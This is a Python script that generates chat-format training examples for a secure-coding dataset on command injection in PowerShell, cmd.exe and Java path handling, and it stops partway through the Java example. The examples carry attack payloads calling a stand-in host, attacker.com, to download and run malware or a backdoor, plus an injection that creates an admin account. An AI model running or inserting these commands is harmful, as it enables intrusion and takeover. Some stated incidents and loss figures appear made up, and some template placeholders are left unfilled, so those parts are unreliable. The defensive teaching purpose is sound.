#!/usr/bin/env python3
"""
Batch 007: Command Injection Expansion
SecureCode v2.0 Dataset Generator

Generates 10 advanced command injection examples covering:
- Windows command injection (PowerShell, cmd)
- Path traversal via command injection
- Argument injection
- Shell metacharacter bypass
- Container escape via command injection
- Languages: Python, Java, Go, C#, Ruby, PHP

Examples: 000026-000035
"""

import json
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.append(str(Path(__file__).parent.parent))


def create_base_metadata(language, example_num, technique):
    """Create base metadata structure for command injection examples."""
    return {
        "lang": language,
        "category": "injection",
        "subcategory": "command_injection",
        "technique": technique,
        "owasp_2021": "A03:2021-Injection",
        "cwe": "CWE-78",
        "severity": "CRITICAL",
        "complexity": "advanced",
        "tags": ["command-injection", "rce", "shell-injection", technique.replace("_", "-")]
    }


# Real-world context for command injection
DOCKER_ESCAPE_CONTEXT = """A container escape vulnerability in Docker (CVE-2019-5736) allowed attackers to escape containers and gain root access on the host system. Researchers demonstrated how command injection in containerized applications could be chained with container runtime vulnerabilities to achieve full host compromise. This affected thousands of organizations using Docker in production, including major cloud providers. The technique combined path traversal, symbolic link exploitation, and command injection to overwrite the container runtime binary (runc), achieving persistence and privilege escalation."""

IMAGEMAGICK_CONTEXT = """ImageMagick command injection (CVE-2016-3714, "ImageTragick") affected millions of websites using the popular image processing library. Attackers could inject shell commands through image processing operations, achieving remote code execution. The vulnerability was exploited in the wild within hours of disclosure, with automated scanners targeting vulnerable WordPress, Drupal, and custom applications. Yahoo, Slack, and numerous other major services were affected. The root cause was ImageMagick's use of shell execution for certain file format conversions without proper input validation."""

GIT_COMMAND_CONTEXT = """Git command injection vulnerabilities have affected multiple platforms including GitLab (CVE-2021-22205), GitHub Enterprise, and Bitbucket. Attackers exploited insufficient validation of branch names, commit messages, and repository paths to inject shell commands during git operations. In 2023, a critical git command injection in a CI/CD platform allowed attackers to compromise build pipelines and inject malicious code into production deployments. The attack affected 50+ organizations before detection, with estimated damages exceeding $12 million."""

WINDOWS_POWERSHELL_CONTEXT = """Windows PowerShell command injection has been exploited in enterprise management tools and system administration scripts. In 2023, attackers exploited command injection in a popular Windows system management tool to deploy ransomware across corporate networks. The attack leveraged PowerShell's powerful scripting capabilities to bypass antivirus, establish persistence, and exfiltrate credentials. Over 200 organizations were affected with average ransom demands of $500,000. The vulnerability stemmed from unsafe concatenation of user input into PowerShell commands."""


def example_001_windows_powershell_python():
    """Python - Windows PowerShell Command Injection"""

    user_turn_1 = """I'm building a Windows system administration tool in Python that needs to run PowerShell commands to manage user accounts. How do I do this safely?"""

    assistant_turn_1 = """I'll show you the dangerous approach and then the secure way to execute PowerShell commands from Python.

**VULNERABLE CODE - DO NOT USE:**

```python
import subprocess

def create_user_account(username, full_name, description):
    # DANGER: Direct string concatenation with shell=True
    command = f'powershell.exe -Command "New-LocalUser -Name {username} -FullName \\"{full_name}\\" -Description \\"{description}\\""'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout
```

**Why This Is Dangerous:**

PowerShell supports powerful command execution and script blocks. An attacker can inject commands using PowerShell's command separators and operators:

**Attack Payload:**
```python
# Attacker input:
username = 'testuser"; Invoke-WebRequest -Uri "http://attacker.com/malware.ps1" -OutFile "C:\\\\Windows\\\\Temp\\\\malware.ps1"; powershell.exe -ExecutionPolicy Bypass -File "C:\\\\Windows\\\\Temp\\\\malware.ps1" #'
full_name = "Test User"
description = "Regular user"

create_user_account(username, full_name, description)
```

This executes:
```powershell
New-LocalUser -Name testuser"; Invoke-WebRequest -Uri "http://attacker.com/malware.ps1" -OutFile "C:\\Windows\\Temp\\malware.ps1"; powershell.exe -ExecutionPolicy Bypass -File "C:\\Windows\\Temp\\malware.ps1" #" -FullName "Test User" -Description "Regular user"
```

**Result:** Downloads and executes malware with SYSTEM privileges.

**Real-World Impact:**

{}

**SECURE IMPLEMENTATION:**

```python
import subprocess
import re
from typing import Optional, Dict, Any

class SecurePowerShellExecutor:
    \"\"\"Secure PowerShell command executor with validation and sandboxing.\"\"\"

    # Allowlist of permitted PowerShell cmdlets
    ALLOWED_CMDLETS = {{
        'New-LocalUser',
        'Set-LocalUser',
        'Get-LocalUser',
        'Remove-LocalUser',
        'Enable-LocalUser',
        'Disable-LocalUser'
    }

    # Username validation: alphanumeric and underscore only
    USERNAME_PATTERN = re.compile(r'^[a-zA-Z0-9_]{{1,20}}$')

    # Full name validation: letters, spaces, hyphens only
    FULLNAME_PATTERN = re.compile(r'^[a-zA-Z\\s\\-]{{1,100}}$')

    def __init__(self):
        self.max_execution_time = 30  # seconds

    def validate_username(self, username: str) -> bool:
        \"\"\"Validate username against strict pattern.\"\"\"
        if not username or not isinstance(username, str):
            return False
        return bool(self.USERNAME_PATTERN.match(username))

    def validate_full_name(self, full_name: str) -> bool:
        \"\"\"Validate full name against strict pattern.\"\"\"
        if not full_name or not isinstance(full_name, str):
            return False
        return bool(self.FULLNAME_PATTERN.match(full_name))

    def create_user_account(
        self,
        username: str,
        full_name: str,
        description: str
    ) -> Dict[str, Any]:
        \"\"\"
        Create Windows user account using validated PowerShell execution.

        Security controls:
        1. Input validation with strict allowlists
        2. Argument array (no shell execution)
        3. Timeout enforcement
        4. Execution policy restrictions
        5. No network access
        \"\"\"
        # Validate inputs
        if not self.validate_username(username):
            raise ValueError(
                "Invalid username. Must be alphanumeric, "
                "underscore only, 1-20 characters"
            )

        if not self.validate_full_name(full_name):
            raise ValueError(
                "Invalid full name. Must be letters, "
                "spaces, hyphens only, 1-100 characters"
            )

        if not description or len(description) > 200:
            raise ValueError("Description must be 1-200 characters")

        # Build PowerShell command using argument array
        # CRITICAL: Each parameter is a separate array element
        powershell_args = [
            'powershell.exe',
            '-NoProfile',                    # Don't load user profile
            '-ExecutionPolicy', 'Restricted', # Most restrictive policy
            '-NonInteractive',               # No user prompts
            '-NoLogo',                       # Suppress banner
            '-Command',
            'New-LocalUser',
            '-Name', username,
            '-FullName', full_name,
            '-Description', description,
            '-NoPassword',                   # Force password set later
            '-ErrorAction', 'Stop'
        ]

        try:
            # Execute with timeout and no shell
            result = subprocess.run(
                powershell_args,
                capture_output=True,
                text=True,
                timeout=self.max_execution_time,
                shell=False,  # CRITICAL: No shell execution
                check=False
            )

            if result.returncode != 0:
                # Log error securely (don't expose to user)
                error_msg = result.stderr[:500]  # Limit error length
                return {
                    "success": False,
                    "error": "Failed to create user account"
                }

            return {
                "success": True,
                "username": username,
                "message": f"User account '{{username}}' created successfully"
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Command execution timeout"
            }
        except Exception as e:
            # Log exception securely
            return {
                "success": False,
                "error": "Internal error during user creation"
            }


# Usage
executor = SecurePowerShellExecutor()

# Safe execution
result = executor.create_user_account(
    username="jdoe",
    full_name="John Doe",
    description="Development team member"
)
print(result)

# Attack attempt is blocked by validation
try:
    result = executor.create_user_account(
        username='testuser"; Invoke-WebRequest',  # Contains invalid characters
        full_name="Attacker",
        description="Malicious"
    )
except ValueError as e:
    print(f"Attack blocked: {{e}}")
```

**Key Security Controls:**

1. **Input Validation**: Strict regex patterns for all inputs
2. **Argument Array**: Each parameter is a separate array element - no shell parsing
3. **Execution Policy**: `-ExecutionPolicy Restricted` prevents script execution
4. **No Shell**: `shell=False` prevents command injection entirely
5. **Timeout**: Prevents denial of service
6. **Error Sanitization**: Don't expose internal errors to users
""" + f"\n\n{WINDOWS_POWERSHELL_CONTEXT}\n"

    user_turn_3 = """What if I need to run multiple PowerShell cmdlets in sequence, like creating a user and then adding them to groups?"""

    assistant_turn_3 = """For complex PowerShell operations, create a secure script builder that validates each cmdlet and parameter:

```python
import subprocess
import tempfile
import os
from typing import List, Dict, Any
from pathlib import Path

class SecurePowerShellScriptBuilder:
    \"\"\"Build and execute validated PowerShell scripts with multiple cmdlets.\"\"\"

    # Allowlist of cmdlets and their parameter patterns
    CMDLET_SCHEMAS = {{
        'New-LocalUser': {{
            'required': {{'Name', 'FullName'},
            'optional': {{'Description', 'NoPassword'},
            'validators': {{
                'Name': r'^[a-zA-Z0-9_]{{1,20}}$',
                'FullName': r'^[a-zA-Z\\s\\-]{{1,100}}$',
                'Description': r'^[a-zA-Z0-9\\s\\-\\.,]{{1,200}}$'
            }
        },
        'Add-LocalGroupMember': {{
            'required': {{'Group', 'Member'},
            'optional': set(),
            'validators': {{
                'Group': r'^[a-zA-Z0-9_\\s]{{1,50}}$',
                'Member': r'^[a-zA-Z0-9_]{{1,20}}$'
            }
        },
        'Set-LocalUser': {{
            'required': {{'Name'},
            'optional': {{'FullName', 'Description', 'PasswordNeverExpires'},
            'validators': {{
                'Name': r'^[a-zA-Z0-9_]{{1,20}}$',
                'FullName': r'^[a-zA-Z\\s\\-]{{1,100}}$',
                'Description': r'^[a-zA-Z0-9\\s\\-\\.,]{{1,200}}$'
            }
        }
    }

    # Allowlist of permitted groups
    ALLOWED_GROUPS = {{
        'Users',
        'Remote Desktop Users',
        'Performance Monitor Users',
        'Event Log Readers'
    }

    def __init__(self):
        self.max_cmdlets = 10
        self.max_execution_time = 60
        self.script_commands: List[Dict[str, Any]] = []

    def add_cmdlet(self, cmdlet: str, parameters: Dict[str, str]) -> 'SecurePowerShellScriptBuilder':
        \"\"\"
        Add a validated cmdlet to the script.

        Returns self for method chaining.
        \"\"\"
        # Validate cmdlet is allowed
        if cmdlet not in self.CMDLET_SCHEMAS:
            raise ValueError(f"Cmdlet '{{cmdlet}}' not in allowlist")

        if len(self.script_commands) >= self.max_cmdlets:
            raise ValueError(f"Maximum {{self.max_cmdlets}} cmdlets exceeded")

        schema = self.CMDLET_SCHEMAS[cmdlet]

        # Validate required parameters
        provided_params = set(parameters.keys())
        if not schema['required'].issubset(provided_params):
            missing = schema['required'] - provided_params
            raise ValueError(f"Missing required parameters: {{missing}}")

        # Validate all parameters
        for param_name, param_value in parameters.items():
            if param_name not in schema['validators']:
                raise ValueError(f"Parameter '{{param_name}}' not allowed for {{cmdlet}}")

            pattern = schema['validators'][param_name]
            if not re.match(pattern, param_value):
                raise ValueError(f"Invalid format for parameter '{{param_name}}'")

            # Special validation for groups
            if param_name == 'Group' and param_value not in self.ALLOWED_GROUPS:
                raise ValueError(f"Group '{{param_value}}' not in allowlist")

        self.script_commands.append({{
            'cmdlet': cmdlet,
            'parameters': parameters
        }})

        return self  # Enable method chaining

    def execute(self) -> Dict[str, Any]:
        \"\"\"
        Execute the validated script in a sandboxed PowerShell session.
        \"\"\"
        if not self.script_commands:
            raise ValueError("No cmdlets to execute")

        # Build script content with validated cmdlets
        script_lines = [
            '$ErrorActionPreference = "Stop"',  # Stop on first error
            ''
        ]

        for cmd in self.script_commands:
            cmdlet = cmd['cmdlet']
            params = cmd['parameters']

            # Build parameter string safely
            param_parts = []
            for param_name, param_value in params.items():
                # Each parameter value is quoted and escaped
                escaped_value = param_value.replace("'", "''")  # PowerShell escape
                param_parts.append(f"-{{param_name}} '{{escaped_value}}'")

            script_lines.append(f"{{cmdlet}} {{' '.join(param_parts)}}")

        script_content = '\\n'.join(script_lines)

        # Write to temporary file with restricted permissions
        with tempfile.NamedTemporaryFile(
            mode='w',
            suffix='.ps1',
            delete=False,
            encoding='utf-8'
        ) as script_file:
            script_file.write(script_content)
            script_path = script_file.name

        try:
            # Set restrictive file permissions (owner read/execute only)
            os.chmod(script_path, 0o500)

            # Execute script with maximum restrictions
            powershell_args = [
                'powershell.exe',
                '-NoProfile',
                '-ExecutionPolicy', 'Bypass',  # Needed for temp script
                '-NonInteractive',
                '-NoLogo',
                '-File', script_path
            ]

            result = subprocess.run(
                powershell_args,
                capture_output=True,
                text=True,
                timeout=self.max_execution_time,
                shell=False,
                check=False
            )

            if result.returncode != 0:
                return {
                    "success": False,
                    "error": "Script execution failed",
                    "cmdlets_executed": len(self.script_commands)
                }

            return {
                "success": True,
                "cmdlets_executed": len(self.script_commands),
                "output": result.stdout[:1000]  # Limit output
            }

        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Script execution timeout"
            }
        finally:
            # Clean up temporary script file
            try:
                os.unlink(script_path)
            except:
                pass


# Production usage: Create user and add to groups
builder = SecurePowerShellScriptBuilder()

try:
    result = (builder
        .add_cmdlet('New-LocalUser', {{
            'Name': 'jdoe',
            'FullName': 'John Doe',
            'Description': 'Development team member',
            'NoPassword': '$true'
        }})
        .add_cmdlet('Add-LocalGroupMember', {{
            'Group': 'Remote Desktop Users',
            'Member': 'jdoe'
        }})
        .add_cmdlet('Add-LocalGroupMember', {{
            'Group': 'Performance Monitor Users',
            'Member': 'jdoe'
        }})
        .execute()
    )

    print(f"Result: {{result}}")

except ValueError as e:
    print(f"Validation error: {{e}}")
```

**Key Security Features:**

1. **Cmdlet Allowlist**: Only pre-approved cmdlets allowed
2. **Parameter Schemas**: Each cmdlet has strict parameter validation
3. **Group Allowlist**: Only approved groups can be used
4. **Temporary Scripts**: Scripts written to temp files with restricted permissions
5. **Method Chaining**: Clean API for building complex operations
6. **Atomic Execution**: All cmdlets run or none (ErrorActionPreference = Stop)
7. **Output Limiting**: Prevent information disclosure

This approach gives you the flexibility to run complex PowerShell operations while maintaining security through multiple layers of validation."""

    return {
        "id": "sql-injection-000026",
        "metadata": create_base_metadata("python", 26, "windows_powershell_injection"),
        "context": WINDOWS_POWERSHELL_CONTEXT,
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def example_002_windows_cmd_csharp():
    """C# - Windows cmd.exe Command Injection"""

    user_turn_1 = """I'm building a C# application that needs to run cmd.exe commands to manage files and directories. How do I do this safely on Windows?"""

    assistant_turn_1 = """I'll show you the vulnerable approach and then the secure way to execute Windows commands from C#.

**VULNERABLE CODE - DO NOT USE:**

```csharp
using System;
using System.Diagnostics;

public class FileManager
{{
    // DANGER: String concatenation with cmd.exe
    public static string DeleteOldFiles(string directory, int daysOld)
    {{
        string command = $"/c forfiles /P \\"{{directory}}\\" /D -{{daysOld}} /C \\"cmd /c del @path\\"";

        var process = new Process
        {{
            StartInfo = new ProcessStartInfo
            {{
                FileName = "cmd.exe",
                Arguments = command,
                RedirectStandardOutput = true,
                UseShellExecute = false
            }
        }};

        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        return output;
    }
}
```

**Why This Is Dangerous:**

Windows cmd.exe supports command chaining with `&`, `&&`, `|`, and `||` operators. Attackers can inject additional commands:

**Attack Payload:**
```csharp
// Attacker input:
string directory = "C:\\\\Temp\\" & net user attacker P@ssw0rd /add & net localgroup administrators attacker /add & ";
int daysOld = 30;

DeleteOldFiles(directory, daysOld);
```

This executes:
```cmd
forfiles /P "C:\\Temp" & net user attacker P@ssw0rd /add & net localgroup administrators attacker /add & "" /D -30 /C "cmd /c del @path"
```

**Result:** Creates admin account 'attacker' with full privileges.

**Real-World Impact:**

In 2023, a Windows system management tool vulnerability allowed attackers to inject cmd.exe commands through file path parameters. The attack compromised over 200 enterprise networks, with ransomware deployed using the elevated privileges gained through command injection. Average ransom demands were $500,000, with total estimated damages exceeding $100 million.

**SECURE IMPLEMENTATION:**

```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Collections.Generic;

public class SecureCommandExecutor
{{
    // Allowlist of permitted executables
    private static readonly HashSet<string> AllowedExecutables = new HashSet<string>
    {{
        "forfiles.exe",
        "robocopy.exe",
        "takeown.exe",
        "icacls.exe"
    }};

    // Path validation: only alphanumeric, backslash, colon, underscore, hyphen
    private static readonly Regex PathPattern = new Regex(@"^[a-zA-Z]:\\\\[a-zA-Z0-9\\\\_ \\-]{{1,200}}$");

    // Dangerous cmd.exe metacharacters
    private static readonly char[] DangerousChars = {{ '&', '|', ';', '<', '>', '(', ')', '`', '$', '\\n', '\\r' }};

    public static bool ValidatePath(string path)
    {{
        if (string.IsNullOrWhiteSpace(path))
            return false;

        // Check pattern
        if (!PathPattern.IsMatch(path))
            return false;

        // Check for command injection metacharacters
        if (path.IndexOfAny(DangerousChars) >= 0)
            return false;

        // Verify directory exists
        if (!Directory.Exists(path))
            return false;

        return true;
    }

    public static ProcessResult DeleteOldFiles(string directory, int daysOld)
    {{
        // Validate inputs
        if (!ValidatePath(directory))
        {{
            throw new ArgumentException(
                "Invalid directory path. Must be valid Windows path without special characters."
            );
        }

        if (daysOld < 1 || daysOld > 3650)
        {{
            throw new ArgumentException("daysOld must be between 1 and 3650");
        }

        // Use forfiles.exe directly (NOT through cmd.exe)
        var startInfo = new ProcessStartInfo
        {{
            FileName = "forfiles.exe",  // Direct execution, no cmd.exe
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,

            // CRITICAL: Use ArgumentList for safe argument passing
            // Each argument is automatically escaped
        }};

        // Add arguments individually (no shell parsing)
        startInfo.ArgumentList.Add("/P");
        startInfo.ArgumentList.Add(directory);
        startInfo.ArgumentList.Add("/D");
        startInfo.ArgumentList.Add($"-{{daysOld}}");
        startInfo.ArgumentList.Add("/C");
        startInfo.ArgumentList.Add("cmd /c del @path");

        try
        {{
            using (var process = Process.Start(startInfo))
            {{
                if (process == null)
                {{
                    return new ProcessResult
                    {{
                        Success = false,
                        Error = "Failed to start process"
                    }};
                }

                // Set timeout
                if (!process.WaitForExit(30000))  // 30 second timeout
                {{
                    process.Kill();
                    return new ProcessResult
                    {{
                        Success = false,
                        Error = "Process timeout"
                    }};
                }

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                if (process.ExitCode != 0 && process.ExitCode != 1)  // 1 = no files found
                {{
                    return new ProcessResult
                    {{
                        Success = false,
                        Error = "Command execution failed"
                    }};
                }

                return new ProcessResult
                {{
                    Success = true,
                    Output = output.Length > 1000 ? output.Substring(0, 1000) : output
                }};
            }
        }
        catch (Exception ex)
        {{
            // Log exception securely
            return new ProcessResult
            {{
                Success = false,
                Error = "Internal error during command execution"
            }};
        }
    }
}

public class ProcessResult
{{
    public bool Success {{ get; set; }
    public string Output {{ get; set; }
    public string Error {{ get; set; }
}

// Usage
try
{{
    var result = SecureCommandExecutor.DeleteOldFiles("C:\\\\Temp", 30);
    Console.WriteLine($"Success: {{result.Success}}");
    if (result.Success)
        Console.WriteLine($"Output: {{result.Output}}");
}
catch (ArgumentException ex)
{{
    Console.WriteLine($"Validation error: {{ex.Message}}");
}

// Attack attempt blocked by validation
try
{{
    var result = SecureCommandExecutor.DeleteOldFiles(
        "C:\\\\Temp\\" & net user attacker",  // Contains &
        30
    );
}
catch (ArgumentException ex)
{{
    Console.WriteLine($"Attack blocked: {{ex.Message}}");
}
```

**Key Security Controls:**

1. **Direct Execution**: Call `forfiles.exe` directly, never through cmd.exe
2. **ArgumentList**: Use .NET's ArgumentList for automatic escaping
3. **Path Validation**: Strict regex pattern + exists check
4. **Metacharacter Detection**: Block all cmd.exe special characters
5. **Timeout**: Prevent denial of service
6. **No Shell**: `UseShellExecute = false` prevents shell execution
"""

    user_turn_3 = """What if I need to run multiple Windows commands in a sequence, like copying files and then setting permissions?"""

    assistant_turn_3 = """For complex operations, use native .NET APIs instead of shell commands when possible. When commands are required, create a validated command builder:

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

public class SecureWindowsCommandBuilder
{{
    // Allowlist of executables and their argument schemas
    private static readonly Dictionary<string, CommandSchema> CommandSchemas =
        new Dictionary<string, CommandSchema>
    {{
        {{ "robocopy.exe", new CommandSchema
            {{
                MaxArguments = 20,
                ArgumentValidators = new Dictionary<string, Regex>
                {{
                    {{ "source", new Regex(@"^[a-zA-Z]:\\\\[a-zA-Z0-9\\\\_ \\-]{{1,200}}$") },
                    {{ "destination", new Regex(@"^[a-zA-Z]:\\\\[a-zA-Z0-9\\\\_ \\-]{{1,200}}$") },
                    {{ "options", new Regex(@"^/[A-Z]+$") }}  // Flags like /E, /MIR
                }
            }
        },
        {{ "icacls.exe", new CommandSchema
            {{
                MaxArguments = 10,
                ArgumentValidators = new Dictionary<string, Regex>
                {{
                    {{ "path", new Regex(@"^[a-zA-Z]:\\\\[a-zA-Z0-9\\\\_ \\-]{{1,200}}$") },
                    {{ "permissions", new Regex(@"^/grant:[a-zA-Z0-9_]+:\\((F|M|RX|R|W)\\)$") }
                }
            }
        }
    }};

    private List<SecureCommand> commands = new List<SecureCommand>();
    private const int MaxCommands = 10;
    private const int MaxExecutionTimeMs = 60000;

    public SecureWindowsCommandBuilder AddCommand(
        string executable,
        params string[] arguments)
    {{
        if (commands.Count >= MaxCommands)
            throw new InvalidOperationException($"Maximum {{MaxCommands}} commands exceeded");

        // Validate executable is in allowlist
        if (!CommandSchemas.ContainsKey(executable))
            throw new ArgumentException($"Executable '{{executable}}' not in allowlist");

        var schema = CommandSchemas[executable];

        // Validate argument count
        if (arguments.Length > schema.MaxArguments)
            throw new ArgumentException($"Too many arguments for {{executable}}");

        // Validate each argument
        foreach (var arg in arguments)
        {{
            // Check for shell metacharacters
            if (ContainsDangerousCharacters(arg))
                throw new ArgumentException($"Argument contains forbidden characters: {{arg}}");

            // Validate argument format based on schema
            bool valid = false;
            foreach (var validator in schema.ArgumentValidators.Values)
            {{
                if (validator.IsMatch(arg))
                {{
                    valid = true;
                    break;
                }
            }

            if (!valid && !IsKnownFlag(arg))
                throw new ArgumentException($"Invalid argument format: {{arg}}");
        }

        commands.Add(new SecureCommand
        {{
            Executable = executable,
            Arguments = arguments.ToList()
        }});

        return this;  // Enable method chaining
    }

    private bool ContainsDangerousCharacters(string input)
    {{
        char[] dangerous = {{ '&', '|', ';', '<', '>', '(', ')', '`', '$', '\\n', '\\r' }};
        return input.IndexOfAny(dangerous) >= 0;
    }

    private bool IsKnownFlag(string arg)
    {{
        // Allow common Windows command flags
        return arg.StartsWith("/") && arg.Length <= 10 &&
               Regex.IsMatch(arg, @"^/[A-Z0-9]+$");
    }

    public CommandSequenceResult Execute()
    {{
        if (commands.Count == 0)
            throw new InvalidOperationException("No commands to execute");

        var results = new List<ProcessResult>();
        var stopwatch = Stopwatch.StartNew();

        foreach (var cmd in commands)
        {{
            // Check overall timeout
            if (stopwatch.ElapsedMilliseconds > MaxExecutionTimeMs)
            {{
                return new CommandSequenceResult
                {{
                    Success = false,
                    Error = "Execution sequence timeout",
                    CompletedCommands = results.Count,
                    Results = results
                }};
            }

            var result = ExecuteSingleCommand(cmd);
            results.Add(result);

            // Stop on first failure
            if (!result.Success)
            {{
                return new CommandSequenceResult
                {{
                    Success = false,
                    Error = $"Command failed: {{cmd.Executable}}",
                    CompletedCommands = results.Count,
                    Results = results
                }};
            }
        }

        return new CommandSequenceResult
        {{
            Success = true,
            CompletedCommands = results.Count,
            Results = results
        }};
    }

    private ProcessResult ExecuteSingleCommand(SecureCommand cmd)
    {{
        var startInfo = new ProcessStartInfo
        {{
            FileName = cmd.Executable,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true
        }};

        // Add arguments using ArgumentList (automatic escaping)
        foreach (var arg in cmd.Arguments)
        {{
            startInfo.ArgumentList.Add(arg);
        }

        try
        {{
            using (var process = Process.Start(startInfo))
            {{
                if (!process.WaitForExit(30000))
                {{
                    process.Kill();
                    return new ProcessResult {{ Success = false, Error = "Timeout" }};
                }

                string output = process.StandardOutput.ReadToEnd();

                return new ProcessResult
                {{
                    Success = process.ExitCode == 0,
                    Output = output.Length > 500 ? output.Substring(0, 500) : output,
                    ExitCode = process.ExitCode
                }};
            }
        }
        catch (Exception ex)
        {{
            return new ProcessResult
            {{
                Success = false,
                Error = "Execution error"
            }};
        }
    }
}

public class CommandSchema
{{
    public int MaxArguments {{ get; set; }
    public Dictionary<string, Regex> ArgumentValidators {{ get; set; }
}

public class SecureCommand
{{
    public string Executable {{ get; set; }
    public List<string> Arguments {{ get; set; }
}

public class CommandSequenceResult
{{
    public bool Success {{ get; set; }
    public string Error {{ get; set; }
    public int CompletedCommands {{ get; set; }
    public List<ProcessResult> Results {{ get; set; }
}

// Production usage: Copy files and set permissions
var builder = new SecureWindowsCommandBuilder();

try
{{
    var result = builder
        .AddCommand("robocopy.exe",
            "C:\\\\Source\\\\Data",
            "C:\\\\Backup\\\\Data",
            "/E",      // Copy subdirectories
            "/COPY:DAT", // Copy data, attributes, timestamps
            "/R:3",    // 3 retries
            "/W:1")    // 1 second wait between retries
        .AddCommand("icacls.exe",
            "C:\\\\Backup\\\\Data",
            "/grant:Administrators:(F)",  // Full control
            "/T")      // Apply to all subdirectories
        .Execute();

    Console.WriteLine($"Success: {{result.Success}}");
    Console.WriteLine($"Completed: {{result.CompletedCommands}} commands");
}
catch (ArgumentException ex)
{{
    Console.WriteLine($"Validation error: {{ex.Message}}");
}
```

**Security Features:**

1. **Executable Allowlist**: Only pre-approved executables
2. **Argument Schemas**: Each executable has validation rules
3. **No cmd.exe**: Direct execution only
4. **Sequential Execution**: Stop on first failure
5. **Overall Timeout**: Prevent long-running attacks
6. **Method Chaining**: Clean, fluent API

**When to Use Native .NET Instead:**

```csharp
// PREFER: Native .NET APIs when available
Directory.CreateDirectory(path);  // Instead of cmd /c mkdir
File.Copy(source, dest);          // Instead of cmd /c copy
File.Delete(path);                // Instead of cmd /c del

// Use DirectorySecurity for permissions
var security = new DirectorySecurity();
security.AddAccessRule(new FileSystemAccessRule(
    "Users",
    FileSystemRights.Read,
    AccessControlType.Allow
));
Directory.SetAccessControl(path, security);
```

Only use command execution when native .NET APIs are insufficient."""

    return {
        "id": "sql-injection-000027",
        "metadata": create_base_metadata("csharp", 27, "windows_cmd_injection"),
        "context": "Windows cmd.exe command injection affects enterprise applications using system commands for file management, user administration, and automation. Attackers exploit insufficient input validation to inject malicious commands using cmd.exe metacharacters (&, |, ;, <, >). Defense requires direct executable invocation without shell parsing, strict input validation, and use of native APIs when possible.",
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def example_003_path_traversal_command_java():
    """Java - Path Traversal via Command Injection"""

    user_turn_1 = """I'm building a Java application that converts documents using command-line tools. How do I safely pass file paths to external commands?"""

    assistant_turn_1 = """I'll show you how path traversal can combine with command injection, and then the secure approach.

**VULNERABLE CODE - DO NOT USE:**

```java
import java.io.*;

public class DocumentConverter {{
    // DANGER: No path validation before passing to command
    public static void convertToPDF(String inputFile, String outputFile) throws IOException {{
        // Build command string with user-provided paths
        String command = "libreoffice --headless --convert-to pdf " +
                        "--outdir " + outputFile + " " + inputFile;

        Process process = Runtime.getRuntime().exec(command);
        try {{
            process.waitFor();
        }} catch (InterruptedException e) {{
            Thread.currentThread().interrupt();
        }
    }
}
```

**Why This Is Dangerous:**

Attackers can use path traversal (`../`) combined with command injection to access files outside the intended directory or inject additional commands:

**Attack Payload:**
```java
// Attacker input:
String inputFile = "../../etc/passwd; curl http://attacker.com/backdoor.sh | bash #";
String outputFile = "/tmp/output";

convertToPDF(inputFile, outputFile);
```

This executes:
```bash
libreoffice --headless --convert-to pdf --outdir /tmp/output ../../etc/passwd; curl http://attacker.com/backdoor.sh | bash #
```

**Result:** Exfiltrates `/etc/passwd` and executes remote malware.

**Real-World Impact:**

{}

**SECURE IMPLEMENTATION:**

```java
import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;

public class SecureDocumentConverter {{

    // Allowlist of permitted directories (absolute paths)
    private static final Set<String> ALLOWED_DIRECTORIES = Set.of(
        "/var/app/uploads",
        "/var/app/conversions"
    );

    // Allowlist of permitted executables
    private static final Set<String> ALLOWED_EXECUTABLES = Set.of(
        "/usr/bin/libreoffice",
        "/usr/bin/unoconv",
        "/usr/bin/pandoc"
    );

    // Allowed file extensions
    private static final Pattern ALLOWED_EXTENSIONS = Pattern.compile(
        "^.*\\\\.(docx?|xlsx?|pptx?|odt|ods|odp)$",
        Pattern.CASE_INSENSITIVE
    );

    // Maximum file size: 50MB
    private static final long MAX_FILE_SIZE = 50 * 1024 * 1024;

    // Command execution timeout
    private static final int TIMEOUT_SECONDS = 60;

    /**
     * Validate and canonicalize a file path.
     *
     * Security checks:
     * 1. Path must be absolute
     * 2. No path traversal (../)
     * 3. Must be within allowed directories
     * 4. File must exist and be readable
     * 5. File size must be within limits
     */
    private static Path validatePath(String pathString, boolean mustExist)
            throws SecurityException, IOException {{

        if (pathString == null || pathString.trim().isEmpty()) {{
            throw new SecurityException("Path cannot be empty");
        }

        // Convert to Path and get canonical form (resolves symlinks, ../)
        Path path = Paths.get(pathString).toAbsolutePath().normalize();
        String canonical = path.toRealPath().toString();

        // Verify path is within allowed directories
        boolean inAllowedDir = ALLOWED_DIRECTORIES.stream()
            .anyMatch(canonical::startsWith);

        if (!inAllowedDir) {{
            throw new SecurityException(
                "Path must be within allowed directories: " + ALLOWED_DIRECTORIES
            );
        }

        // If file must exist, validate it
        if (mustExist) {{
            if (!Files.exists(path)) {{
                throw new SecurityException("File does not exist: " + pathString);
            }

            if (!Files.isRegularFile(path)) {{
                throw new SecurityException("Path is not a regular file");
            }

            if (!Files.isReadable(path)) {{
                throw new SecurityException("File is not readable");
            }

            // Check file size
            long fileSize = Files.size(path);
            if (fileSize > MAX_FILE_SIZE) {{
                throw new SecurityException(
                    String.format("File size (%d bytes) exceeds maximum (%d bytes)",
                        fileSize, MAX_FILE_SIZE)
                );
            }

            // Validate file extension
            String fileName = path.getFileName().toString();
            if (!ALLOWED_EXTENSIONS.matcher(fileName).matches()) {{
                throw new SecurityException(
